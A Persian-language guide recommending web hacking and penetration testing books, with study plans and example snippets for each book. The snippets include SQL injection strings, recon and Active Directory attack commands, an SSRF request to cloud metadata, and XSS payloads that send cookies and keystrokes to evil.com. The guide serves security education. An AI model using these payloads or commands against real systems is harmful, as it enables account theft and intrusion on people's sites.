# 📚 بهترین کتاب‌های هک وب و امنیت (Web Hacking Books Guide)

<div dir="rtl">

## 👋 مقدمه

می‌خوای یه هکر اخلاقی حرفه‌ای بشی؟ کتاب بخون! 📖

این راهنما بهترین کتاب‌های دنیا رو برای یادگیری هک وب، تست نفوذ و امنیت معرفی می‌کنه!

از مبتدی تا حرفه‌ای، همه چی اینجاست! 🚀

---

## 🎯 دسته‌بندی کتاب‌ها

### 📗 سطح مبتدی (Beginner)
### 📘 سطح متوسط (Intermediate)
### 📕 سطح پیشرفته (Advanced)
### 📙 کتاب‌های تخصصی (Specialized)

---

## 📗 کتاب‌های مبتدی

### 1. "The Web Application Hacker's Handbook" 👑

**نویسندگان:** Dafydd Stuttard & Marcus Pinto

**چرا باید بخونی؟**
این کتاب **بایبل هک وب** هست! همه چیز رو از صفر یاد میده!

#### محتوا:
```
✅ Mapping Applications
✅ Client-Side Controls را دور بزن
✅ Authentication Attacks
✅ Session Management
✅ Access Controls
✅ SQL Injection (فصل کامل!)
✅ XSS (فصل کامل!)
✅ CSRF, XXE, SSRF
✅ Logic Flaws
✅ Automation
```

#### مثال از کتاب:

```
فصل 9: SQL Injection

"تصور کن یه فرم جستجو داری:
SELECT * FROM products WHERE name = 'USER_INPUT'

حالا کاربر بنویسه:
' OR '1'='1

Query میشه:
SELECT * FROM products WHERE name = '' OR '1'='1'

همه محصولات برمی‌گرده! 💀"
```

#### تمرین‌ها:
- ✅ Lab های عملی داره
- ✅ هر فصل Challenge داره
- ✅ با PortSwigger Academy همخونی داره

**صفحات:** 912 صفحه
**سطح:** مبتدی تا متوسط
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

**کجا تهیه کنی؟**
- Amazon
- [PortSwigger Website](https://portswigger.net/web-security)

---

### 2. "Bug Bounty Bootcamp" 💰

**نویسنده:** Vickie Li

**چرا باید بخونی؟**
مخصوص Bug Bounty نوشته شده! از صفر تا حرفه‌ای!

#### محتوا:
```
✅ چطور شروع کنی Bug Bounty
✅ Reconnaissance
✅ انواع آسیب‌پذیری‌ها
✅ نوشتن Report حرفه‌ای
✅ مثال‌های واقعی از Bug های پیدا شده
✅ چطور پول دربیاری! 💸
```

#### نکات طلایی از کتاب:

```
"قبل از هک، Recon کن!

1. Subdomain Enumeration
   subfinder -d target.com

2. Port Scanning
   nmap -sV target.com

3. Directory Brute Force
   gobuster dir -u http://target.com

4. Technology Detection
   wappalyzer

5. Google Dorking
   site:target.com filetype:pdf
   site:target.com inurl:admin

هر ساعت Recon = صد باگ پیدا میشه! 🎯"
```

#### داستان‌های واقعی:

```
"یه نفر از طریق IDOR توی API Instagram،
تونست عکس‌های Private رو ببینه!

Vulnerability:
GET /api/v1/users/{user_id}/private_photos

فقط با تغییر user_id!

Bounty: $10,000 💰"
```

**صفحات:** 450 صفحه
**سطح:** مبتدی
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 3. "Real-World Bug Hunting" 🌍

**نویسنده:** Peter Yaworski

**چرا باید بخونی؟**
همه‌اش مثال واقعی! از گزارش‌های واقعی Bug Bounty!

#### محتوا:
```
✅ 60+ گزارش واقعی
✅ Open Redirect
✅ XSS های خلاقانه
✅ CSRF Bypass
✅ XXE Exploitation
✅ SSRF Cases
✅ Race Conditions
✅ Remote Code Execution
```

#### مثال از کتاب:

```
Case Study: Shopify SSRF

یه نفر پیدا کرد که endpoint ای که URL می‌گیره،
SSRF داره!

POST /webhooks/verify
{
    "url": "http://169.254.169.254/latest/meta-data/"
}

AWS Metadata رو خوند!
Bounty: $25,000 💰🎉
```

**صفحات:** 264 صفحه
**سطح:** مبتدی تا متوسط
**امتیاز:** ⭐⭐⭐⭐ (4/5)

---

## 📘 کتاب‌های سطح متوسط

### 4. "The Hacker Playbook 3" 🎮

**نویسنده:** Peter Kim

**چرا باید بخونی؟**
مثل یه راهنمای گام‌به‌گام برای تست نفوذ!

#### محتوا:
```
✅ Red Team Tactics
✅ Active Directory Attacks
✅ PowerShell Empire
✅ Lateral Movement
✅ Privilege Escalation
✅ Persistence
✅ Evading Detection
```

#### ابزارها و تکنیک‌ها:

```bash
# Network Attacks
responder -I eth0
ntlmrelayx.py -t 192.168.1.10

# Password Attacks
hashcat -m 1000 hashes.txt rockyou.txt

# Web Attacks
burpsuite
sqlmap -u "URL" --dbs

# Post-Exploitation
mimikatz
bloodhound
```

**صفحات:** 400 صفحه
**سطح:** متوسط
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 5. "Web Security Testing Cookbook" 🍳

**نویسنده:** Paco Hope & Ben Walther

**چرا باید بخونی؟**
دستور پخت برای تست امنیت وب! 😄

#### محتوا:
```
✅ 100+ Recipe عملی
✅ Testing Authentication
✅ Testing Session Management
✅ Testing Authorization
✅ Input Validation Testing
✅ Error Handling Testing
✅ Cryptography Testing
```

#### مثال Recipe:

```
Recipe 3.4: Testing for SQL Injection

Ingredients:
- Burp Suite
- Target URL with parameter
- SQL payloads

Steps:
1. Intercept request
2. Send to Repeater
3. Test with: '
4. Test with: ' OR '1'='1
5. Test with: ' AND 1=1--
6. Analyze responses
7. If different → Vulnerable! 🎯

Expected Result:
Error message or different behavior = SQL Injection exists!
```

**صفحات:** 312 صفحه
**سطح:** متوسط
**امتیاز:** ⭐⭐⭐⭐ (4/5)

---

### 6. "Mastering Modern Web Penetration Testing" 💻

**نویسنده:** Prakhar Prasad

**چرا باید بخونی؟**
مخصوص تکنولوژی‌های مدرن! React, Angular, APIs!

#### محتوا:
```
✅ Testing Single Page Applications (SPA)
✅ REST API Security
✅ GraphQL Security
✅ WebSocket Security
✅ JWT Attacks
✅ OAuth 2.0 Vulnerabilities
✅ Modern JavaScript Frameworks
```

#### مثال JWT Attack:

```javascript
// JWT Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xyz

// Decoded:
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "admin"
}

// Attack 1: Algorithm Confusion
// تغییر "alg" به "none"

// Attack 2: Weak Secret
# hashcat -m 16500 jwt.txt rockyou.txt

// Attack 3: Key Injection
// استفاده از public key به عنوان secret!
```

**صفحات:** 298 صفحه
**سطح:** متوسط تا پیشرفته
**امتیاز:** ⭐⭐⭐⭐ (4/5)

---

## 📕 کتاب‌های پیشرفته

### 7. "Advanced Penetration Testing" 🎯

**نویسنده:** Wil Allsopp

**چرا باید بخونی؟**
برای Red Teaming حرفه‌ای!

#### محتوا:
```
✅ Advanced Reconnaissance
✅ Social Engineering
✅ Physical Penetration
✅ Wireless Attacks
✅ Evading Detection
✅ APT Simulation
✅ Writing Custom Exploits
```

**صفحات:** 480 صفحه
**سطح:** پیشرفته
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 8. "Black Hat Python" 🐍

**نویسنده:** Justin Seitz

**چرا باید بخونی؟**
یاد میده ابزار خودت رو بنویسی!

#### محتوا:
```
✅ Network Sniffing
✅ Building Trojans
✅ Web Hacking با Python
✅ Exploit Development
✅ Bypassing Antivirus
✅ Automating Attacks
```

#### مثال کد:

```python
# Port Scanner ساده
import socket

def port_scan(target, ports):
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))

        if result == 0:
            print(f"[+] Port {port} باز است!")
        sock.close()

# استفاده
port_scan("192.168.1.1", range(1, 1000))
```

```python
# SQL Injection Scanner ساده
import requests

def test_sql_injection(url):
    payloads = ["'", "' OR '1'='1", "1' AND '1'='1"]

    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "error" in response.text.lower():
            print(f"[!] آسیب‌پذیر: {payload}")
        elif len(response.text) != len(requests.get(url).text):
            print(f"[!] رفتار متفاوت: {payload}")

# استفاده
test_sql_injection("http://example.com/product?id=")
```

**صفحات:** 192 صفحه
**سطح:** متوسط تا پیشرفته
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

## 📙 کتاب‌های تخصصی

### 9. "SQL Injection Attacks and Defense" 💉

**نویسندگان:** Justin Clarke & team

**چرا باید بخونی؟**
همه چیز درباره SQL Injection! از A تا Z!

#### محتوا:
```
✅ Finding SQL Injection
✅ Exploiting SQL Injection
✅ Blind SQL Injection
✅ Advanced Techniques
✅ WAF Bypass
✅ Prevention Methods
✅ Secure Coding
```

**صفحات:** 576 صفحه
**سطح:** متوسط تا پیشرفته
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 10. "XSS Attacks: Cross Site Scripting Exploits and Defense" 🕷️

**نویسندگان:** Seth Fogie & team

**چرا باید بخونی؟**
تخصصی روی XSS!

#### محتوا:
```
✅ انواع XSS (Reflected, Stored, DOM-based)
✅ XSS در JavaScript Frameworks
✅ XSS Payloads کاربردی
✅ Bypassing Filters
✅ XSS به RCE
✅ Prevention
```

#### Payloads خلاقانه:

```html
<!-- Basic -->
<script>alert(1)</script>

<!-- Bypass Filters -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- DOM XSS -->
eval(location.hash.slice(1))

<!-- Stealing Cookies -->
<script>
fetch('http://evil.com?c='+document.cookie)
</script>

<!-- Keylogger XSS -->
<script>
document.onkeypress = function(e) {
    fetch('http://evil.com?k='+e.key)
}
</script>
```

**صفحات:** 480 صفحه
**سطح:** متوسط تا پیشرفته
**امتیاز:** ⭐⭐⭐⭐ (4/5)

---

### 11. "API Security in Action" 🔐

**نویسنده:** Neil Madden

**چرا باید بخونی؟**
امروزه همه چی API هست! باید امنیتش رو بلد باشی!

#### محتوا:
```
✅ REST API Security
✅ Authentication & Authorization
✅ OAuth 2.0 & OpenID Connect
✅ JWT Security
✅ Rate Limiting
✅ API Gateway Security
```

**صفحات:** 384 صفحه
**سطح:** متوسط
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 12. "Mobile Application Penetration Testing" 📱

**نویسنده:** Vijay Kumar Velu

**چرا باید بخونی؟**
برای تست امنیت اپ‌های موبایل!

#### محتوا:
```
✅ Android Security
✅ iOS Security
✅ Reverse Engineering
✅ SSL Pinning Bypass
✅ Root/Jailbreak Detection
✅ Insecure Storage
✅ API Testing
```

**صفحات:** 350 صفحه
**سطح:** متوسط
**امتیاز:** ⭐⭐⭐⭐ (4/5)

---

## 📖 کتاب‌های مرجع

### 13. "OWASP Testing Guide v4" 📚

**نویسنده:** OWASP Foundation

**چرا باید بخونی؟**
استاندارد جهانی تست امنیت وب!

#### محتوا:
```
✅ Testing Checklist کامل
✅ 100+ Test Case
✅ Methodology
✅ Tools
✅ Reporting
```

**مزیت:** رایگان! PDF رایگان دانلود کن!

**لینک:** [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

**صفحات:** 250+ صفحه
**سطح:** همه سطوح
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

### 14. "The Tangled Web" 🕸️

**نویسنده:** Michal Zalewski (Google Security)

**چرا باید بخونی؟**
عمیق‌ترین کتاب درباره امنیت مرورگر!

#### محتوا:
```
✅ Browser Security Model
✅ Same-Origin Policy
✅ Content Sniffing
✅ Character Encoding
✅ Weird Behaviors
✅ Security از نگاه مرورگرها
```

**صفحات:** 320 صفحه
**سطح:** پیشرفته
**امتیاز:** ⭐⭐⭐⭐⭐ (5/5)

---

## 🎯 برنامه مطالعاتی پیشنهادی

### ماه اول: پایه
```
1. The Web Application Hacker's Handbook (فصل‌های اول)
2. Bug Bounty Bootcamp (تا فصل 5)
```

### ماه دوم: تمرین
```
1. Real-World Bug Hunting
2. شروع Bug Bounty روی HackerOne
3. تمرین روی PortSwigger Labs
```

### ماه سوم: تخصصی
```
1. Web Security Testing Cookbook
2. یکی از کتاب‌های تخصصی (SQL Injection یا XSS)
```

### ماه چهارم: پیشرفته
```
1. The Hacker Playbook 3
2. Black Hat Python
3. شرکت در CTF ها
```

---

## 💡 نکات مطالعه

### ✅ DO (انجام بده):
- ✅ حتما تمرین‌ها رو انجام بده
- ✅ یادداشت برداری کن
- ✅ Lab بساز و امتحان کن
- ✅ با دیگران بحث کن
- ✅ به ترتیب بخون (از مبتدی شروع کن)

### ❌ DON'T (انجام نده):
- ❌ فقط بخون بدون تمرین
- ❌ از یه کتاب به کتاب دیگه بپر
- ❌ عجله کنی (صبر داشته باش!)
- ❌ فقط تئوری یاد بگیری

---

## 📱 کتاب‌های رایگان آنلاین

```
1. OWASP Testing Guide
   https://owasp.org/www-project-web-security-testing-guide/

2. Web Application Hackers Handbook (نسخه قدیمی)
   (جستجو کن در اینترنت)

3. SANS Reading Room
   https://www.sans.org/reading-room/

4. Pentester Academy Books
   https://www.pentesteracademy.com/

5. GitHub Security Books
   https://github.com/topics/security-books
```

---

## 🎁 Bonus: Cheat Sheets

```
# OWASP Cheat Sheet Series
https://cheatsheetseries.owasp.org/

# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

# HackTricks
https://book.hacktricks.xyz/
```

---

## 📊 جدول مقایسه کتاب‌ها

| کتاب | سطح | صفحات | تمرینات | امتیاز |
|------|-----|-------|---------|--------|
| Web App Hacker's Handbook | مبتدی-متوسط | 912 | ✅✅✅ | ⭐⭐⭐⭐⭐ |
| Bug Bounty Bootcamp | مبتدی | 450 | ✅✅ | ⭐⭐⭐⭐⭐ |
| Real-World Bug Hunting | مبتدی | 264 | ✅ | ⭐⭐⭐⭐ |
| Hacker Playbook 3 | متوسط | 400 | ✅✅✅ | ⭐⭐⭐⭐⭐ |
| Black Hat Python | پیشرفته | 192 | ✅✅✅ | ⭐⭐⭐⭐⭐ |

---

## 🎓 نکته آخر

```
کتاب خوندن خوبه، ولی...

10% خوندن + 90% تمرین = موفقیت! 🎯

پس:
1. یه کتاب انتخاب کن
2. فصل‌به‌فصل بخون
3. حتما تمرین کن
4. Lab بساز
5. Bug پیدا کن!

موفق باشی! 📚🚀
```

**"Books are good, but practice makes perfect!" (کتاب خوبه، ولی تمرین کامل می‌کنه!)**

</div>
